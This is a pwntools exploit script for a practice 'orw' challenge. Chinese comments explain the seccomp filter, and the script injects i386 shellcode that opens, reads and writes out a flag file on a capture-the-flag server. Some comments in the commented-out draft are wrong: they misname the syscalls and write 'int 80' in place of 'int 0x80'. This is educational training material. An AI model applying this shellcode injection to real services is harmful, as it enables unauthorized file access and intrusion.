from pwn import *

p = process(r'./pwnable_orw')
r = remote('node5.buuoj.cn', 25003)
context.log_level = 'debug'
context.arch = 'i386'


'''
orw_seccomp()函数中的prctl函数是沙盒机制，正常情况下，程序可以使用所有的syscall
但是当劫持程序流程之后通过exeve来呼叫syscall得到shell时seccomp边排上了用场，他可以过滤掉某些syscall，只允许使用部分syscall。
使用seccomp-tools可以直接查看程序允许哪些系统函数: seccomp-tools dump ./orw
本题系统内核只允许使用sys_open，sys_read，sys_write
系统内核的调用就是利用int 0x80 去调用函数的这种过程

# 所以本题的思路是open打开flag，read读入flag，write输出flag
'''
# shellcode = asm(shellcraft.sh())
"""
    // int open( const char * pathname,int flags, mode_t mode);
    // open('flag', 0, 0)
    // ebx=flag, ecx=0, edx=0
    mov eax, 0x5;  // i386下的open函数系统调用号是5
    push 0;        // \0 截断结尾
    push 0x67616c66;   // flag字符串的hex：666c6167，小端序为：0x67616c66
    mov ebx, esp;  // esp指向字符串"flag\0"
    xor ecx, ecx;
    xor edx, edx;
    int 0x80;

    // read(fd, esp, 0x50)    fd即open的返回值，存在eax中。
    mov ebx, eax;   // eax为open的返回值，即读取到的文件的file ID(如果读取失败则返回-1)
    mov ecx, esp;   // esp处用作缓冲区读取flag (也可以选择bss区域)
    mov edx, 0x50;  // size
    mov eax, 0x3;   // i386下的open函数系统调用号是3
    int 80;

    // write(1, esp, 0x50)
    mov ebx, 0x1;
    mov ecx, esp;   // read函数读取到的东西放在esp
    mov edx, 0x50;
    mov eax, 0x4    // i386下的open函数系统调用号是4
    int 80;
"""
shellcode = '''
push 0;
push 0x67616c66;
mov ebx, esp;
xor ecx, ecx;
xor edx, edx;
mov eax, 0x5;
int 0x80;

mov ebx, eax;
mov ecx, esp;
mov edx, 0x50;
mov eax, 0x3;
int 0x80;

mov ebx, 0x1;
mov ecx, esp;
mov edx, 0x50;
mov eax, 0x4;
int 0x80;
'''
# bss = 0x804A060

shellcode2 = shellcraft.open('flag')
shellcode2 += shellcraft.read('eax', 'esp', 100)
shellcode2 += shellcraft.write(1, 'esp', 100)

r.sendafter(b':', asm(shellcode2))
r.interactive()
